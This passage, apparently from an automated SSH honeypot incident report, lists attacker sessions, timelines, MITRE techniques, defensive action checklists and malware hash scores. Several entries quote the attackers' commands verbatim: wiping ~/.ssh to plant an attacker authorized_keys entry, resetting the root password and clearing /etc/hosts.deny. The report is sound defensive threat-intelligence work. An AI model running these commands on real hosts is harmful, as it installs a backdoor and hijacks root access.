| `2026-04-07 16:40:09` | `cowrie.command.input` |
| `2026-04-07 16:40:09` | `cowrie.log.closed` |
| `2026-04-07 16:40:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.91[.]34` to AbuseIPDB if not already reported
- [ ] Block `101.126.91[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b458348df5e

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-07 16:42 |
| **Last Seen** | 2026-04-07 16:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:42:24` | `cowrie.session.connect` |
| `2026-04-07 16:42:24` | `cowrie.client.version` |
| `2026-04-07 16:42:24` | `cowrie.client.kex` |
| `2026-04-07 16:42:25` | `cowrie.login.success` |
| `2026-04-07 16:42:25` | `cowrie.session.params` |
| `2026-04-07 16:42:25` | `cowrie.command.input` |
| `2026-04-07 16:42:25` | `cowrie.command.failed` |
| `2026-04-07 16:42:25` | `cowrie.log.closed` |
| `2026-04-07 16:42:26` | `cowrie.session.params` |
| `2026-04-07 16:42:26` | `cowrie.command.input` |
| `2026-04-07 16:42:26` | `cowrie.session.file_download` |
| `2026-04-07 16:42:26` | `cowrie.log.closed` |
| `2026-04-07 16:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4529cf8e3986

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-07 16:42 |
| **Last Seen** | 2026-04-07 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:42:28` | `cowrie.session.connect` |
| `2026-04-07 16:42:28` | `cowrie.client.version` |
| `2026-04-07 16:42:28` | `cowrie.client.kex` |
| `2026-04-07 16:42:29` | `cowrie.login.success` |
| `2026-04-07 16:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac426b22626d

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-07 16:44 |
| **Last Seen** | 2026-04-07 16:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:44:36` | `cowrie.session.connect` |
| `2026-04-07 16:44:36` | `cowrie.client.version` |
| `2026-04-07 16:44:36` | `cowrie.client.kex` |
| `2026-04-07 16:44:36` | `cowrie.login.success` |
| `2026-04-07 16:44:37` | `cowrie.session.params` |
| `2026-04-07 16:44:37` | `cowrie.command.input` |
| `2026-04-07 16:44:37` | `cowrie.command.failed` |
| `2026-04-07 16:44:37` | `cowrie.log.closed` |
| `2026-04-07 16:44:37` | `cowrie.session.params` |
| `2026-04-07 16:44:37` | `cowrie.command.input` |
| `2026-04-07 16:44:38` | `cowrie.session.file_download` |
| `2026-04-07 16:44:38` | `cowrie.log.closed` |
| `2026-04-07 16:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbd1e30d39e3

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-07 16:44 |
| **Last Seen** | 2026-04-07 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:44:40` | `cowrie.session.connect` |
| `2026-04-07 16:44:40` | `cowrie.client.version` |
| `2026-04-07 16:44:40` | `cowrie.client.kex` |
| `2026-04-07 16:44:41` | `cowrie.login.success` |
| `2026-04-07 16:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12fc6227e4d2

| Field | Detail |
|---|---|
| **Source IP** | `101.126.91[.]34` |
| **First Seen** | 2026-04-07 16:45 |
| **Last Seen** | 2026-04-07 16:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:45:22` | `cowrie.session.connect` |
| `2026-04-07 16:45:22` | `cowrie.client.version` |
| `2026-04-07 16:45:23` | `cowrie.client.kex` |
| `2026-04-07 16:45:24` | `cowrie.login.success` |
| `2026-04-07 16:45:24` | `cowrie.session.params` |
| `2026-04-07 16:45:24` | `cowrie.command.input` |
| `2026-04-07 16:45:24` | `cowrie.command.failed` |
| `2026-04-07 16:45:24` | `cowrie.log.closed` |
| `2026-04-07 16:45:25` | `cowrie.session.params` |
| `2026-04-07 16:45:25` | `cowrie.command.input` |
| `2026-04-07 16:45:25` | `cowrie.session.file_download` |
| `2026-04-07 16:45:25` | `cowrie.log.closed` |
| `2026-04-07 16:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.91[.]34` to AbuseIPDB if not already reported
- [ ] Block `101.126.91[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83f99ed8c018

| Field | Detail |
|---|---|
| **Source IP** | `101.126.91[.]34` |
| **First Seen** | 2026-04-07 16:45 |
| **Last Seen** | 2026-04-07 16:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:45:28` | `cowrie.session.connect` |
| `2026-04-07 16:45:28` | `cowrie.client.version` |
| `2026-04-07 16:45:28` | `cowrie.client.kex` |
| `2026-04-07 16:45:30` | `cowrie.login.success` |
| `2026-04-07 16:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.91[.]34` to AbuseIPDB if not already reported
- [ ] Block `101.126.91[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5024dbe332a8

| Field | Detail |
|---|---|
| **Source IP** | `101.126.91[.]34` |
| **First Seen** | 2026-04-07 16:45 |
| **Last Seen** | 2026-04-07 16:46 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:d4JIRSzPMtiv"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:45:46` | `cowrie.session.connect` |
| `2026-04-07 16:45:46` | `cowrie.client.version` |
| `2026-04-07 16:45:47` | `cowrie.client.kex` |
| `2026-04-07 16:45:47` | `cowrie.login.success` |
| `2026-04-07 16:45:48` | `cowrie.session.params` |
| `2026-04-07 16:45:48` | `cowrie.command.input` |
| `2026-04-07 16:45:48` | `cowrie.command.failed` |
| `2026-04-07 16:45:48` | `cowrie.log.closed` |
| `2026-04-07 16:45:49` | `cowrie.session.params` |
| `2026-04-07 16:45:49` | `cowrie.command.input` |
| `2026-04-07 16:45:49` | `cowrie.session.file_download` |
| `2026-04-07 16:45:49` | `cowrie.log.closed` |
| `2026-04-07 16:46:02` | `cowrie.session.params` |
| `2026-04-07 16:46:02` | `cowrie.command.input` |
| `2026-04-07 16:46:03` | `cowrie.log.closed` |
| `2026-04-07 16:46:04` | `cowrie.session.params` |
| `2026-04-07 16:46:04` | `cowrie.command.input` |
| `2026-04-07 16:46:04` | `cowrie.log.closed` |
| `2026-04-07 16:46:04` | `cowrie.session.params` |
| `2026-04-07 16:46:04` | `cowrie.command.input` |
| `2026-04-07 16:46:05` | `cowrie.session.file_download` |
| `2026-04-07 16:46:05` | `cowrie.log.closed` |
| `2026-04-07 16:46:05` | `cowrie.session.params` |
| `2026-04-07 16:46:05` | `cowrie.command.input` |
| `2026-04-07 16:46:05` | `cowrie.log.closed` |
| `2026-04-07 16:46:06` | `cowrie.session.params` |
| `2026-04-07 16:46:06` | `cowrie.command.input` |
| `2026-04-07 16:46:06` | `cowrie.log.closed` |
| `2026-04-07 16:46:06` | `cowrie.session.params` |
| `2026-04-07 16:46:06` | `cowrie.command.input` |
| `2026-04-07 16:46:06` | `cowrie.command.input` |
| `2026-04-07 16:46:06` | `cowrie.log.closed` |
| `2026-04-07 16:46:08` | `cowrie.session.params` |
| `2026-04-07 16:46:08` | `cowrie.command.input` |
| `2026-04-07 16:46:08` | `cowrie.log.closed` |
| `2026-04-07 16:46:08` | `cowrie.session.params` |
| `2026-04-07 16:46:08` | `cowrie.command.input` |
| `2026-04-07 16:46:08` | `cowrie.log.closed` |
| `2026-04-07 16:46:09` | `cowrie.session.params` |
| `2026-04-07 16:46:09` | `cowrie.command.input` |
| `2026-04-07 16:46:09` | `cowrie.log.closed` |
| `2026-04-07 16:46:10` | `cowrie.session.params` |
| `2026-04-07 16:46:10` | `cowrie.command.input` |
| `2026-04-07 16:46:10` | `cowrie.log.closed` |
| `2026-04-07 16:46:10` | `cowrie.session.params` |
| `2026-04-07 16:46:10` | `cowrie.command.input` |
| `2026-04-07 16:46:11` | `cowrie.log.closed` |
| `2026-04-07 16:46:11` | `cowrie.session.params` |
| `2026-04-07 16:46:11` | `cowrie.command.input` |
| `2026-04-07 16:46:11` | `cowrie.log.closed` |
| `2026-04-07 16:46:12` | `cowrie.session.params` |
| `2026-04-07 16:46:12` | `cowrie.command.input` |
| `2026-04-07 16:46:12` | `cowrie.log.closed` |
| `2026-04-07 16:46:13` | `cowrie.session.params` |
| `2026-04-07 16:46:13` | `cowrie.command.input` |
| `2026-04-07 16:46:13` | `cowrie.log.closed` |
| `2026-04-07 16:46:13` | `cowrie.session.params` |
| `2026-04-07 16:46:13` | `cowrie.command.input` |
| `2026-04-07 16:46:13` | `cowrie.log.closed` |
| `2026-04-07 16:46:14` | `cowrie.session.params` |
| `2026-04-07 16:46:14` | `cowrie.command.input` |
| `2026-04-07 16:46:14` | `cowrie.log.closed` |
| `2026-04-07 16:46:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.91[.]34` to AbuseIPDB if not already reported
- [ ] Block `101.126.91[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44448f3488c7

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-07 16:46 |
| **Last Seen** | 2026-04-07 16:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:46:29` | `cowrie.session.connect` |
| `2026-04-07 16:46:29` | `cowrie.client.version` |
| `2026-04-07 16:46:29` | `cowrie.client.kex` |
| `2026-04-07 16:46:30` | `cowrie.login.success` |
| `2026-04-07 16:46:31` | `cowrie.session.params` |
| `2026-04-07 16:46:31` | `cowrie.command.input` |
| `2026-04-07 16:46:31` | `cowrie.command.failed` |
| `2026-04-07 16:46:31` | `cowrie.log.closed` |
| `2026-04-07 16:46:31` | `cowrie.session.params` |
| `2026-04-07 16:46:31` | `cowrie.command.input` |
| `2026-04-07 16:46:31` | `cowrie.session.file_download` |
| `2026-04-07 16:46:31` | `cowrie.log.closed` |
| `2026-04-07 16:46:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-978715324ad6

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-07 16:46 |
| **Last Seen** | 2026-04-07 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:46:34` | `cowrie.session.connect` |
| `2026-04-07 16:46:34` | `cowrie.client.version` |
| `2026-04-07 16:46:34` | `cowrie.client.kex` |
| `2026-04-07 16:46:35` | `cowrie.login.success` |
| `2026-04-07 16:46:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626c45ad0743

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-07 16:48 |
| **Last Seen** | 2026-04-07 16:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:48:23` | `cowrie.session.connect` |
| `2026-04-07 16:48:23` | `cowrie.client.version` |
| `2026-04-07 16:48:24` | `cowrie.client.kex` |
| `2026-04-07 16:48:24` | `cowrie.login.success` |
| `2026-04-07 16:48:25` | `cowrie.session.params` |
| `2026-04-07 16:48:25` | `cowrie.command.input` |
| `2026-04-07 16:48:25` | `cowrie.command.failed` |
| `2026-04-07 16:48:25` | `cowrie.log.closed` |
| `2026-04-07 16:48:25` | `cowrie.session.params` |
| `2026-04-07 16:48:25` | `cowrie.command.input` |
| `2026-04-07 16:48:26` | `cowrie.session.file_download` |
| `2026-04-07 16:48:26` | `cowrie.log.closed` |
| `2026-04-07 16:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-037b32d77e50

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-07 16:48 |
| **Last Seen** | 2026-04-07 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:48:28` | `cowrie.session.connect` |
| `2026-04-07 16:48:28` | `cowrie.client.version` |
| `2026-04-07 16:48:28` | `cowrie.client.kex` |
| `2026-04-07 16:48:29` | `cowrie.login.success` |
| `2026-04-07 16:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `38.19.156[.]18` | **25** | 2026-04-07 15:12 | 2026-04-07 15:57 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.91[.]34` | **19** | 2026-04-07 16:38 | 2026-04-07 16:49 | 25m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.210.149[.]130` | **9** | 2026-04-07 16:35 | 2026-04-07 16:54 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `157.245.243[.]118` | **2** | 2026-04-07 15:40 | 2026-04-07 15:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.87[.]35` | 1 | 2026-04-07 15:12 | 2026-04-07 15:12 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.37[.]34` | 1 | 2026-04-07 16:36 | 2026-04-07 16:38 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
